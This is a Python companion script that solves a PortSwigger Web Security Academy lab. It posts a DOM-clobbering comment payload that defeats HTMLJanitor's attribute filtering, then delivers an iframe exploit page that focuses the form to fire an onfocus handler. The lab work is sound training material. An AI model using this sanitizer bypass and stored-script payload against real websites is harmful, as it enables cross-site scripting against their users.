#!/usr/bin/env python3
"""
Clobbering DOM attributes to bypass HTML filters
PortSwigger Web Security Academy -- DOM-Based Vulnerabilities

Companion script for the writeup: 07-dom-clobbering-attribute-filter-bypass.md

What this does:
    Posts a comment containing `<form id=x tabindex=0 onfocus=print()><input
    id=attributes></form>`. HTMLJanitor's attribute-stripping loop reads each
    element's `.attributes` property to decide what to remove -- but a child
    `<input id=attributes>` clobbers the form's own `.attributes` property
    with that input element, which has no `.length`. `0 < undefined` is
    `false`, so the removal loop never runs a single iteration and `onfocus`
    survives untouched. `onfocus` only fires when the element actually gains
    focus, which needs a real browser: the exploit page is an iframe that
    loads the post, waits 500ms for the comment to render, then updates its
    own `src` to add a `#x` fragment, which the browser resolves by focusing
    the element with `id=x` -- our clobbered form. Delivered through the
    exploit server; the payload only executes once PortSwigger's own victim
    browser renders the delivered page and performs that fragment navigation,
    so the solve is confirmed by polling the lab's home page afterwards.

Usage:
    python 07-dom-clobbering-attribute-filter-bypass.py <lab-url>
    e.g. python 07-dom-clobbering-attribute-filter-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def get_exploit_server_url(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def find_blog_post(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'href="(/post\?postId=\d+)"', r.text)
    return m.group(1) if m else None


def get_csrf(client, post_url):
    r = client.get(post_url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def exploit_server_deliver(exploit_url, body_html):
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=15) as c:
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "STORE",
        })
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "DELIVER_TO_VICTIM",
        })


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=15)

    exploit_url = get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] Could not find this lab's exploit server URL on the home page.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    post_path = find_blog_post(client, lab_url)
    if not post_path:
        print("[-] Could not find a blog post link on the home page.")
        return
    post_id = post_path.split("=")[-1]
    print(f"[*] Found post: {post_path}")

    # craft_dom_clobbering_attributes_bypass() -- <input id=attributes> clobbers
    # form.attributes, breaking HTMLJanitor's stripping loop before it starts.
    clobber_html = "<form id=x tabindex=0 onfocus=print()><input id=attributes></form>"
    csrf = get_csrf(client, post_path)
    client.post(
        "/post/comment",
        data={"csrf": csrf, "postId": post_id, "comment": clobber_html, "name": "attacker", "email": "attacker@evil.com", "website": ""},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    print("[*] Clobbering comment posted")
    time.sleep(2)

    # The 500ms delay lets the comment finish rendering before the fragment
    # navigation fires -- without it, the focus could race the DOM update.
    full_post_url = f"{lab_url}{post_path}"
    exploit_html = (
        f'<iframe src="{full_post_url}" '
        f"onload=\"setTimeout(()=>this.src='{full_post_url}#x',500)\">"
        f"</iframe>"
    )
    print(f"[*] Exploit page:\n{exploit_html}")

    exploit_server_deliver(exploit_url, exploit_html)
    print("[*] Exploit stored and delivered to victim.")

    time.sleep(5)
    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- fragment navigation focused the clobbered form and fired onfocus.")
    else:
        print("[-] Not solved yet -- give the victim browser a few more seconds and re-check.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
